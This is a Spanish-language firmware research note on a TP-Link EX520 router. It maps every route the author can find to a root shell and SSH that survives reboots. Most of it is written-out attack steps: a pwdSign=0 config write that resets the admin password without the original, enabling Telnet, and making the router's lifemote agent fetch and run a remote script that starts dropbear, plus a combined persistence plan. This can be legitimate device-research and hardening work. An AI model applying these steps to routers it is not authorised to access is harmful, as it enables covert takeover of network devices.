# EX520 — Universo Completo de Mecanismos de Persistencia

> **Fecha:** 2026-08-25
> **Objetivo:** Mapear CADA vía posible para persistencia de SSH + Detectic

---

## Resumen de Hallazgos

El firmware EX520 tiene **más mecanismos de los que parecían inicialmente**. 
La clave es que el `admin_shell_access.md` ya documenta un bypass completo:
`pwdSign=0` → Telnet CLI → new password → lifemote → root shell.

Pero para **persistencia total** (sobrevive reboot sin intervención externa),
las opciones son limitadas. Aquí el análisis completo.

---

## 1. Mecanismos YA PROBADOS

### 1.1 phoenix.sh + watchdog (PROVEN-LIVE)
```
GTPR so DEV2_LIFEMOTE_AGENT → phoenix.sh → curl → sh script
```
- **Persiste reboot:** NO (re-push necesario)
- **Esfuerzo:** Bajo
- **Automático:** Requiere watchdog en host

### 1.2 pwdSign=0 + Telnet CLI (PROVEN-LIVE)
```
GTPR so DEV2_USER_CFG {pwdSign:0} → Telnet CLI → Set new password → Login
```
- **Persiste reboot:** SI (pwdSign=0 persiste en misc_rw)
- **Esfuerzo:** Bajo
- **Shell:** CLI limitado (no /bin/sh directo)

### 1.3 GTPR/GDPR API (PROVEN-LIVE)
```
GTPR gl/so → lectura/escritura de configuración
```
- **Persiste reboot:** SI
- **Shell:** NO (solo configuración)

---

## 2. Mecanismos NO PROBADOS pero VIABLES

### 2.1 Telnet CLI `doFshell` (CANDIDATO FUERTE)

El binary `cli` contiene `doFshell`:
```
strings _rootfs/bin/cli | grep -i 'fshell\|shell\|exec'
```

**Hipótesis:** Si el CLI tiene un comando `fshell` o `shell`, podría dar acceso a `/bin/sh`.

**Prueba:**
```bash
# Conectar por Telnet
telnet fe80::3e6a:d2ff:fe5f:abc1%enp2s0

# En el prompt del CLI:
TP-Link(conf)# fshell
# o
TP-Link(conf)# shell
# o
TP-Link(conf)# doFshell
```

**Si funciona → persistencia via CLI + cron**

### 2.2 dm_restoreCfg → apply handlers (CANDIDATO)

El mecanismo de restore de configuración:
```
backupcfg.bin → dm_restoreCfg → rdp_restoreCfg → apply handlers
```

**Hipótesis:** Si se restaura un backup que tiene SSH habilitado, 
¿los apply handlers se ejecutan y inician dropbear?

**Prueba:**
```bash
# Crear backupcfg.bin con SSH habilitado
# Restaurar via GTPR
gtpr set DEV2_VENDOR_CFG_FILE <backup_data>
```

**Riesgo:** Alto — puede brick si el backup es inválido

### 2.3 /dev/ttyHSL1 — Segundo UART (CANDIDATO)

El button hotplug handler escribe a `/dev/ttyHSL1`:
```bash
echo "ACTION: $ACTION" > /dev/ttyHSL1
```

**Hipótesis:** ttyHSL1 es el High Speed UART (Bluetooth/segunda consola).
Si se puede leer de ttyHSL1, podría haber un segundo canal de comunicación.

**Prueba (desde shell):**
```bash
cat /dev/ttyHSL1 &
echo "test" > /dev/ttyHSL1
```

### 2.4 WiFi debugfs (CANDIDATO DÉBIL)

Algunos drivers MediaTek exponen debugfs:
```bash
ls /sys/kernel/debug/ieee80211/phy*/ 
ls /proc/net/ 
```

**Hipótesis:** Algunos debugfs entries permiten ejecutar comandos.
**Probabilidad:** Baja en firmware de producción.

### 2.5 /proc/tplink/* (CANDIDATO)

El kernel module `tp_board.ko` crea entradas en `/proc/tplink/`:
```
/proc/tplink/console_control
```

**Hipótesis:** Podría haber más entradas en `/proc/tplink/` que permitan 
ejecución o configuración.

**Prueba:**
```bash
ls -la /proc/tplink/
cat /proc/tplink/console_control
```

---

## 3. Mecanismos TEÓRICOS (no probados)

### 3.1 OverlayFS en SquashFS

Si se pudiera montar un overlay sobre `/etc`:
```bash
mount -t overlay overlay -o lowerdir=/etc,upperdir=/var/run/misc/misc_rw/etc_overlay /etc
```

**Problema:** No hay soporte de overlay en el firmware actual.
**Solución:** Requiere kernel module adicional (no disponible).

### 3.2 Modificación de mfg_config.bin

El archivo `mfg_config.bin` se copia a `misc_rw/0x00300000` en el primer boot.
Si se modifica antes de la primera copia...

**Problema:** El primer boot ya happened. No se puede re-ejecutar.

### 3.3 NVRAM / U-Boot env persistente

U-Boot env variables se almacenan en una partition separada.
Si se pudieran agregar variables de auto-arranque...

**Problema:** Requiere acceso U-Boot (UART) o modificación de flash.

### 3.4 tp_dhcp_hook (kernel module)

`tp_board.ko` tiene `dhcpHookInfoHandler` — un hook DHCP en kernel space.

**Hipótesis:** Si se pudiera configurar para ejecutar un script...
**Probabilidad:** Muy baja — es un hook de kernel, no un ejecutor de scripts.

---

## 4. Tabla Resumen: Persistencia

| # | Mecanismo | Persiste reboot | Shell completo | Automático | Riesgo |
|---|-----------|----------------|---------------|------------|--------|
| 1 | phoenix + watchdog | ❌ (re-push) | ✅ | ⚠️ (host) | Bajo |
| 2 | pwdSign=0 + Telnet CLI | ✅ | ⚠️ (CLI) | ❌ | Bajo |
| 3 | UART serial | ✅ | ✅ | ✅ | Bajo |
| 4 | doFshell (si existe) | ❌ | ✅ | ❌ | Bajo |
| 5 | dm_restoreCfg | ✅? | ❓ | ❓ | Alto |
| 6 | /dev/ttyHSL1 | N/A | ❓ | N/A | Bajo |
| 7 | WiFi debugfs | N/A | ❓ | N/A | Bajo |
| 8 | /proc/tplink/* | N/A | ❓ | N/A | Bajo |

---

## 5. Estrategia Recomendada: Persistencia Combinada

### Nivel 1: Inmediato (sin hardware adicional)
```bash
# 1. Habilitar Telnet
gtpr set DEV2_TELNET_CFG {telnetLocalEnabled:1, telnetLocalPort:23}

# 2. Resetear password via pwdSign=0
gtpr set DEV2_USER_CFG {pwdSign:0}

# 3. Conectar por Telnet y设置新密码
telnet fe80::3e6a:d2ff:fe5f:abc1%enp2s0
# → Set new password: <new_pass>
# → Login con nueva password

# 4. Verificar si doFshell existe
# En CLI: fshell / shell / doFshell

# 5. Si no hay shell directo, usar lifemote para dropbear
gtpr set DEV2_LIFEMOTE_AGENT {enable:1, URL:http://host/start_dropbear.sh}

# 6. SSH funciona hasta el próximo reboot
# 7. Watchdog re-habilita después de cada reboot
```

### Nivel 2: Con UART (persistencia total)
```bash
# 1. Conectar UART (ver UART_SERIAL_ACCESS_GUIDE.md)
# 2. Login por serial
# 3. Habilitar SSH + crond
# 4. crond re-inicia dropbear en cada boot
# 5. Persistencia total ✅
```

### Nivel 3: Creativo (sin UART, sin watchdog)
```bash
# Investigar: ¿Se puede usar el mecanismo de auto-upgrade?
# INCLUDE_CLOUD_FW_AUTO_UPGRADE=y
# Si el router descarga firmware automáticamente, ¿se podría
# crear un firmware personalizado que tenga SSH habilitado?

# Investigar: ¿Se puede usar TR-069/CWMP para configurar SSH?
# Algunos routers permiten configuración remota vía TR-069
```

---

## 6. Preguntas Abiertas para Investigar

1. **¿Qué hace `doFshell` en el CLI?** — Si da shell, es la vía más fácil
2. **¿Se puede usar `dm_restoreCfg` para habilitar SSH?** — Requiere backup válido
3. **¿Qué hay en `/dev/ttyHSL1`?** — Segundo UART potencial
4. **¿Se puede usar auto-upgrade para firmware personalizado?** — Requiere firma
5. **¿Hay más entradas en `/proc/tplink/`?** — Kernel module features
6. **¿Se puede usar el WiFi driver para ejecución?** — Debugfs/procy

---

## 7. Conclusión

**Para persistencia REAL sin UART:**
La mejor opción combinatoria es:
1. `pwdSign=0` + Telnet CLI (persiste config)
2. phoenix.sh → dropbear (shell completo)
3. Watchdog en host (re-después de reboot)

**Para persistencia TOTAL:**
UART serial es la ÚNICA vía que no depende de mecanismos externos.

**El bypass `pwdSign=0` es el descubrimiento más valioso** — permite
establecer credenciales conocidas sin conocer las originales, lo que
 facilita todas las demás operaciones.
